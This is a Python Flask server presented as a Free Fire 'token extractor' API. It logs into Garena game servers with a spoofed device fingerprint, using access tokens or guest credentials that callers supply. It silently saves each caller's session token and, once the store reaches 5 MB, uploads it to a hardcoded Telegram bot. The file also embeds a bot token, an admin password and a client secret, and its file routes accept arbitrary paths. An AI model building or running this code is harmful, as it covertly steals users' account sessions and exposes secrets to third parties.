#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MADE BY SEMY - UPDATED WITH WEB INTERFACE
"""
Free Fire Token Extractor API with Web Interface
Access: http://localhost:8006/admin44
Password: M4XPAPA
"""

import json
import requests
import sys
import os
import hashlib
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, session, redirect, url_for
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import threading

# -------------------- Include protobuf generated code --------------------
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()

# --- MajorLoginReq protobuf RIZER ---
DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\x13MajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')

_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'MajorLoginReq_pb2', _globals)
if not _descriptor._USE_C_DESCRIPTORS:
  DESCRIPTOR._loaded_options = None
  _globals['_MAJORLOGIN']._serialized_start = 24
  _globals['_MAJORLOGIN']._serialized_end = 1426
  _globals['_GAMESECURITY']._serialized_start = 1428
  _globals['_GAMESECURITY']._serialized_end = 1481
MajorLogin = _globals['MajorLogin']
GameSecurity = _globals['GameSecurity']

# --- MajorLoginRes protobuf (MajoRLoGinrEs_pb2) ---
DESCRIPTOR2 = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"|\n\rMajorLoginRes\x12\x13\n\x0b\x61\x63\x63ount_uid\x18\x01 \x01(\x04\x12\x0e\n\x06region\x18\x02 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03url\x18\n \x01(\t\x12\x11\n\ttimestamp\x18\x15 \x01(\x03\x12\x0b\n\x03key\x18\x16 \x01(\x0c\x12\n\n\x02iv\x18\x17 \x01(\x0c\x62\x06proto3')
_globals2 = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR2, _globals2)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR2, 'MajorLoginRes_pb2', _globals2)
if not _descriptor._USE_C_DESCRIPTORS:
  DESCRIPTOR2._loaded_options = None
  _globals2['_MAJORLOGINRES']._serialized_start = 23
  _globals2['_MAJORLOGINRES']._serialized_end = 147
MajorLoginRes = _globals2['MajorLoginRes']

# -------------------- End protobuf includes --------------------

app = Flask(__name__)
app.secret_key = 'your-secret-key-here-change-this-in-production'

# Configuration
PASSWORD = "M4XPAPA"
ACCOUNTS_FILE = "Accounts/account.json"
ACCOUNTS_DIR = "Accounts"
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB

# Telegram Configuration - CHANGE THESE
TELEGRAM_BOT_TOKEN = "8696883709:AAG-CO_FiTXioSu5bQ3qbwSG6zRtozUIWjY"  # Replace with your bot token
TELEGRAM_CHAT_ID = "7326248826"      # Replace with your chat ID

# Create Accounts directory if not exists
if not os.path.exists(ACCOUNTS_DIR):
    os.makedirs(ACCOUNTS_DIR)

# Initialize account file if not exists
if not os.path.exists(ACCOUNTS_FILE):
    with open(ACCOUNTS_FILE, 'w') as f:
        json.dump([], f)

# -------------------- HTML Templates --------------------
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Admin Login - FF Token Extractor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            width: 350px;
        }
        .login-container h2 {
            text-align: center;
            color: #333;
            margin-bottom: 30px;
        }
        .login-container input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        .login-container button:hover {
            background: #5a67d8;
        }
        .error {
            color: red;
            text-align: center;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>🔐 Admin Login</h2>
        <form method="POST">
            <input type="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Login</button>
        </form>
        {% if error %}
        <div class="error">{{ error }}</div>
        {% endif %}
    </div>
</body>
</html>
"""

DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Dashboard - FF Token Extractor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .header h1 {
            color: #333;
        }
        .logout-btn {
            background: #e53e3e;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .logout-btn:hover {
            background: #c53030;
        }
        .folder {
            background: #f0f4ff;
            padding: 20px;
            border-radius: 8px;
            cursor: pointer;
            border: 2px solid #667eea;
            transition: 0.3s;
            display: inline-block;
            width: 200px;
            margin: 10px;
        }
        .folder:hover {
            background: #e0e7ff;
            transform: scale(1.05);
        }
        .folder-icon {
            font-size: 48px;
            text-align: center;
            display: block;
        }
        .folder-name {
            text-align: center;
            font-weight: bold;
            margin-top: 10px;
        }
        .file-info {
            margin: 20px 0;
            padding: 15px;
            background: #f0f4ff;
            border-radius: 8px;
        }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }
        .stat-card {
            background: #f7fafc;
            padding: 15px;
            border-radius: 8px;
            border: 1px solid #e2e8f0;
        }
        .stat-card h3 {
            margin: 0;
            color: #4a5568;
        }
        .stat-card p {
            font-size: 24px;
            font-weight: bold;
            margin: 10px 0 0 0;
            color: #2d3748;
        }
        .api-section {
            margin: 20px 0;
            padding: 15px;
            background: #ebf8ff;
            border-radius: 8px;
            border-left: 4px solid #3182ce;
        }
        .api-section code {
            background: #2d3748;
            color: #f7fafc;
            padding: 2px 8px;
            border-radius: 4px;
        }
        .warning {
            color: #e53e3e;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📁 File Manager</h1>
            <a href="/admin44/logout" class="logout-btn">Logout</a>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <h3>📊 Total Accounts</h3>
                <p>{{ total_accounts }}</p>
            </div>
            <div class="stat-card">
                <h3>📦 File Size</h3>
                <p>{{ file_size }}</p>
            </div>
            <div class="stat-card">
                <h3>📅 Last Update</h3>
                <p>{{ last_update }}</p>
            </div>
        </div>
        
        <div class="api-section">
            <h3>🔧 API Endpoint</h3>
            <p><strong>GET</strong> <code>/kirito?access_token=YOUR_TOKEN</code></p>
            <p><strong>GET</strong> <code>/kirito?uid=USER_ID&password=PASSWORD</code></p>
            <p class="warning">⚠️ New accounts are automatically saved to account.json</p>
        </div>
        
        <h2>📂 Available Folders</h2>
        <a href="/admin44/folder/Accounts" style="text-decoration: none;">
            <div class="folder">
                <span class="folder-icon">📁</span>
                <div class="folder-name">Accounts</div>
            </div>
        </a>
        
        <div class="file-info">
            <h3>ℹ️ Auto-Upload Status</h3>
            <p>✅ Auto-upload to Telegram: <strong>{{ auto_upload_status }}</strong></p>
            <p>📏 Max file size: <strong>5 MB</strong></p>
        </div>
    </div>
</body>
</html>
"""

FOLDER_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ folder_name }} - FF Token Extractor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .back-btn {
            background: #667eea;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .back-btn:hover {
            background: #5a67d8;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #e2e8f0;
        }
        th {
            background: #f7fafc;
            font-weight: bold;
            color: #4a5568;
        }
        tr:hover {
            background: #f7fafc;
        }
        .file-link {
            color: #3182ce;
            text-decoration: none;
        }
        .file-link:hover {
            text-decoration: underline;
        }
        .empty {
            text-align: center;
            color: #718096;
            padding: 40px;
        }
        .file-size {
            color: #718096;
            font-size: 14px;
        }
        .account-detail {
            font-size: 12px;
            color: #4a5568;
            background: #f0f4ff;
            padding: 4px 8px;
            border-radius: 4px;
            margin: 2px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📂 {{ folder_name }}</h1>
            <a href="/admin44" class="back-btn">← Back</a>
        </div>
        
        {% if files %}
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>File Name</th>
                    <th>Size</th>
                    <th>Preview</th>
                </tr>
            </thead>
            <tbody>
                {% for file in files %}
                <tr>
                    <td>{{ loop.index }}</td>
                    <td>
                        <a href="/admin44/view/{{ folder_name }}/{{ file.name }}" class="file-link">
                            📄 {{ file.name }}
                        </a>
                    </td>
                    <td class="file-size">{{ file.size }}</td>
                    <td>
                        {% if file.preview %}
                            <div style="max-height: 100px; overflow-y: auto;">
                                {% for item in file.preview[:5] %}
                                <div class="account-detail">
                                    UID: {{ item.account_uid }} | Region: {{ item.region }}
                                </div>
                                {% endfor %}
                                {% if file.preview|length > 5 %}
                                <div class="account-detail">... and {{ file.preview|length - 5 }} more</div>
                                {% endif %}
                            </div>
                        {% else %}
                            <span style="color: #a0aec0;">Empty file</span>
                        {% endif %}
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        {% else %}
        <div class="empty">
            <p>📭 No files found in this folder</p>
        </div>
        {% endif %}
    </div>
</body>
</html>
"""

VIEW_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>{{ file_name }} - FF Token Extractor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #eee;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .back-btn {
            background: #667eea;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
        }
        .back-btn:hover {
            background: #5a67d8;
        }
        .json-view {
            background: #1a202c;
            color: #f7fafc;
            padding: 20px;
            border-radius: 8px;
            overflow-x: auto;
            max-height: 600px;
            overflow-y: auto;
        }
        .json-view pre {
            margin: 0;
            font-family: 'Courier New', monospace;
        }
        .download-btn {
            background: #48bb78;
            color: white;
            padding: 8px 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            margin-left: 10px;
        }
        .download-btn:hover {
            background: #38a169;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📄 {{ file_name }}</h1>
            <div>
                <a href="/admin44/download/{{ folder_name }}/{{ file_name }}" class="download-btn">⬇ Download</a>
                <a href="/admin44/folder/{{ folder_name }}" class="back-btn">← Back</a>
            </div>
        </div>
        <div class="json-view">
            <pre>{{ content }}</pre>
        </div>
    </div>
</body>
</html>
"""

# -------------------- Helper Functions --------------------

def get_file_size(filepath):
    """Get human readable file size"""
    try:
        size = os.path.getsize(filepath)
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size/1024:.2f} KB"
        else:
            return f"{size/(1024*1024):.2f} MB"
    except:
        return "0 B"

def load_accounts():
    """Load accounts from JSON file"""
    try:
        if os.path.exists(ACCOUNTS_FILE):
            with open(ACCOUNTS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return []

def save_account(account_data):
    """Save a single account to JSON file with duplicate check"""
    accounts = load_accounts()
    
    # Check if account already exists (by account_uid)
    account_uid = account_data.get('account_uid')
    if account_uid:
        for existing in accounts:
            if existing.get('account_uid') == account_uid:
                return False  # Account already exists
    
    accounts.append(account_data)
    
    try:
        with open(ACCOUNTS_FILE, 'w') as f:
            json.dump(accounts, f, indent=2)
        return True
    except:
        return False

def send_to_telegram(filepath):
    """Send file to Telegram and delete it"""
    try:
        if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
            print("Telegram bot token not configured")
            return False
            
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(filepath, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            response = requests.post(url, files=files, data=data)
            
        if response.status_code == 200:
            # Delete the file after successful upload
            os.remove(filepath)
            # Create new empty file
            with open(filepath, 'w') as f:
                json.dump([], f)
            print(f"File uploaded to Telegram and deleted: {filepath}")
            return True
        else:
            print(f"Telegram upload failed: {response.text}")
            return False
    except Exception as e:
        print(f"Telegram upload error: {e}")
        return False

def check_and_upload_file():
    """Check file size and upload if exceeds limit"""
    try:
        if os.path.exists(ACCOUNTS_FILE):
            size = os.path.getsize(ACCOUNTS_FILE)
            if size >= MAX_FILE_SIZE:
                print(f"File size {size} exceeds limit, uploading to Telegram...")
                return send_to_telegram(ACCOUNTS_FILE)
    except Exception as e:
        print(f"Error checking file: {e}")
    return False

def decode_jwt(token: str) -> dict:
    import base64
    parts = token.split('.')
    if len(parts) != 3:
        return {}
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + '==').decode())
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + '==').decode())
        return {"header": header, "payload": payload}
    except Exception:
        return {}

def get_garena_token(uid, password):
    url = "https://ffmconnect.live.gop.garenanow.com/oauth/guest/token/grant"
    headers = {
        "User-Agent": "GarenaMSDK/4.0.19P4 (Vivo Y15c; Android 12; en;IN;)",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "uid": uid,
        "password": password,
        "response_type": "token",
        "client_type": "2",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        "client_id": "100067"
    }
    try:
        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

# AES constants
AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

def encrypt_aes(data: bytes) -> bytes:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
    return cipher.encrypt(pad(data, AES.block_size))

def build_major_login(open_id: str, access_token: str, platform_type: int) -> bytes:
    major = MajorLogin()
    major.event_time = "2025-11-26 01:51:28"
    major.game_name = "free fire"
    major.platform_id = 1
    major.client_version = "1.126.1"
    major.system_software = "Android OS 9 / API-28 (PI/rel.cjw.20220518.114133)"
    major.system_hardware = "Handheld"
    major.telecom_operator = "MTN/Spacecetal"
    major.network_type = "WIFI"
    major.screen_width = 1920
    major.screen_height = 1080
    major.screen_dpi = "240"
    major.processor_details = "x86-64 SSE3 SSE4.1 SSE4.2 AVX AVX2 | 2400 | 4"
    major.memory = 7910
    major.gpu_renderer = "Adreno (TM) 640"
    major.gpu_version = "OpenGL ES 3.2"
    major.unique_device_id = "Google|625f7166-91a7-495b-9f16-08fe9d3c6533"
    major.client_ip = "176.28.139.185"
    major.language = "en"
    major.open_id = open_id
    major.open_id_type = "4"
    major.device_type = "Handheld"
    major.memory_available.version = 55
    major.memory_available.hidden_value = 81
    major.access_token = access_token
    major.platform_sdk_id = 1
    major.network_operator_a = "MTN/Spacecetal"
    major.network_type_a = "WIFI"
    major.client_using_version = "1ac4b80ecf0478a44203bf8fac6120f5"
    major.external_storage_total = 47091
    major.external_storage_available = 40784
    major.internal_storage_total = 40784
    major.internal_storage_available = 32080
    major.game_disk_storage_available = 47221
    major.game_disk_storage_total = 32080
    major.external_sdcard_avail_storage = 47221
    major.external_sdcard_total_storage = 32080
    major.login_by = 3
    major.library_path = "/data/app/com.dts.freefireth-fpXCSpHIV6dKC7jL-WOyRA==/lib/arm"
    major.reg_avatar = 1
    major.library_token = "e62ab9354d8fb5fb081db338acb33491|/data/app/com.dts.freefireth-fpXCSpHIV6dKC7jL-WOyRA==/base.apk"
    major.channel_type = 3
    major.cpu_type = 2
    major.cpu_architecture = "32"
    major.client_version_code = "2019119026"
    major.graphics_api = "OpenGLES2"
    major.supported_astc_bitset = 16383
    major.login_open_id_type = 4
    major.analytics_detail = b"\x15\x12\x14\x50\x0e\x59\x03\x49\x51\x0e\x46\x09\x00\x11\x58\x43\x39\x5f\x00\x5b\x51\x0f\x68\x5b\x56\x0a\x61\x07\x57\x6d\x0f\x03\x66"
    major.loading_time = 48862
    major.release_channel = "android"
    major.extra_info = "KqsHT8W93GdcG3ZozENfFwVHtm7qq1eRUNaIDNgRobozIBtLOiYCc4Y6zvvpcICxzQF2sOE4cbytwLs4xZbRnpRMpmWRQKmeO5vcs8nQYBhwqH7K"
    major.android_engine_init_flag = 110009
    major.if_push = 1
    major.is_vpn = 1
    major.origin_platform_type = str(platform_type)
    major.primary_platform_type = str(platform_type)
    return major.SerializeToString()

def try_major_login(open_id: str, access_token: str, platform_type: int):
    payload = build_major_login(open_id, access_token, platform_type)
    encrypted_payload = encrypt_aes(payload)

    url = "https://loginbp.ggpolarbear.com/MajorLogin"
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; ASUS_Z01QD Build/PI)",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Unity-Version": "2018.4.11f1",
        "X-GA": "v1 1",
        "ReleaseVersion": "OB54"
    }
    try:
        resp = requests.post(url, data=encrypted_payload, headers=headers, verify=False, timeout=10)
        if resp.status_code != 200:
            return None
        major_res = MajorLoginRes()
        major_res.ParseFromString(resp.content)
        if major_res.token:
            return {
                "account_uid": str(major_res.account_uid),
                "region": major_res.region,
                "token": major_res.token,
                "url": major_res.url,
                "timestamp": major_res.timestamp,
                "key": major_res.key.hex(),
                "iv": major_res.iv.hex()
            }
    except Exception as e:
        print(f"MajorLogin error for platform {platform_type}: {e}")
    return None

# -------------------- Web Routes --------------------

@app.route('/admin44', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('admin_dashboard'))
        else:
            return render_template_string(LOGIN_TEMPLATE, error="❌ Invalid password!")
    
    if session.get('logged_in'):
        return redirect(url_for('admin_dashboard'))
    
    return render_template_string(LOGIN_TEMPLATE, error=None)

@app.route('/admin44/logout')
def admin_logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/admin44/dashboard')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    # Get stats
    accounts = load_accounts()
    total = len(accounts)
    size = get_file_size(ACCOUNTS_FILE)
    
    # Get last update time
    last_update = "Never"
    if os.path.exists(ACCOUNTS_FILE):
        mtime = os.path.getmtime(ACCOUNTS_FILE)
        last_update = datetime.fromtimestamp(mtime).strftime('%Y-%m-%d %H:%M:%S')
    
    # Check auto-upload status
    auto_status = "Enabled" if TELEGRAM_BOT_TOKEN != "YOUR_BOT_TOKEN_HERE" else "Disabled"
    
    return render_template_string(
        DASHBOARD_TEMPLATE,
        total_accounts=total,
        file_size=size,
        last_update=last_update,
        auto_upload_status=auto_status
    )

@app.route('/admin44/folder/<path:folder_name>')
def view_folder(folder_name):
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    folder_path = os.path.join(os.getcwd(), folder_name)
    if not os.path.exists(folder_path):
        return "Folder not found", 404
    
    files = []
    for filename in os.listdir(folder_path):
        filepath = os.path.join(folder_path, filename)
        if os.path.isfile(filepath):
            file_info = {
                'name': filename,
                'size': get_file_size(filepath),
                'preview': None
            }
            # Preview for JSON files
            if filename.endswith('.json'):
                try:
                    with open(filepath, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, list):
                            file_info['preview'] = data[:10]  # Show first 10 entries
                except:
                    pass
            files.append(file_info)
    
    return render_template_string(
        FOLDER_TEMPLATE,
        folder_name=folder_name,
        files=files
    )

@app.route('/admin44/view/<path:folder_name>/<path:file_name>')
def view_file(folder_name, file_name):
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    filepath = os.path.join(os.getcwd(), folder_name, file_name)
    if not os.path.exists(filepath):
        return "File not found", 404
    
    try:
        with open(filepath, 'r') as f:
            content = f.read()
            # Try to pretty print JSON
            try:
                data = json.loads(content)
                content = json.dumps(data, indent=2)
            except:
                pass
    except:
        content = "Unable to read file"
    
    return render_template_string(
        VIEW_TEMPLATE,
        folder_name=folder_name,
        file_name=file_name,
        content=content
    )

@app.route('/admin44/download/<path:folder_name>/<path:file_name>')
def download_file(folder_name, file_name):
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    filepath = os.path.join(os.getcwd(), folder_name, file_name)
    if not os.path.exists(filepath):
        return "File not found", 404
    
    return send_file(filepath, as_attachment=True)

# -------------------- API Route --------------------

@app.route('/kirito', methods=['GET'])
def kirito_endpoint():
    access_token = request.args.get('access_token')
    uid = request.args.get('uid')
    password = request.args.get('password')

    # If UID/Pass provided, fetch access_token
    if uid and password:
        garena_res = get_garena_token(uid, password)
        if garena_res and 'access_token' in garena_res:
            access_token = garena_res['access_token']
        else:
            return jsonify({"success": False, "error": "Garena Login Failed"}), 401

    if not access_token:
        return jsonify({"error": "Missing access_token or uid/password"}), 400

    # Step 1: Get open_id from Garena inspect endpoint
    inspect_url = f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}"
    try:
        insp_resp = requests.get(inspect_url, timeout=10)
        if insp_resp.status_code != 200:
            return jsonify({"error": "Failed to inspect token", "status_code": insp_resp.status_code}), 400
        insp_data = insp_resp.json()
        open_id = insp_data.get('open_id')
        if not open_id:
            return jsonify({"error": "open_id not found in inspect response"}), 400
    except Exception as e:
        return jsonify({"error": f"Inspect request failed: {str(e)}"}), 500

    # Step 2: Try each platform type
    platform_types = [2, 3, 4, 6, 8]
    last_error = None
    for pt in platform_types:
        result = try_major_login(open_id, access_token, pt)
        if result:
            jwt_decoded = decode_jwt(result['token'])
            
            # Save to accounts file
            account_data = {
                "account_uid": result['account_uid'],
                "region": result['region'],
                "token": result['token'],
                "url": result['url'],
                "timestamp": result['timestamp'],
                "platform_type_used": pt,
                "jwt_decoded": jwt_decoded
            }
            
            saved = save_account(account_data)
            
            # Check file size and upload if needed
            check_and_upload_file()
            
            return jsonify({
                "success": True,
                "platform_type_used": pt,
                "jwt": result['token'],
                "jwt_decoded": jwt_decoded,
                "account_uid": result['account_uid'],
                "region": result['region'],
                "url": result['url'],
                "timestamp": result['timestamp'],
                "saved": saved
            })
        else:
            last_error = f"Failed with platform_type {pt}"
    
    # If we get here, all attempts failed
    return jsonify({
        "success": False,
        "error": "MajorLogin failed. Account may be banned, not registered, or token invalid.",
        "detail": last_error
    }), 401

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8006, debug=False, threaded=True)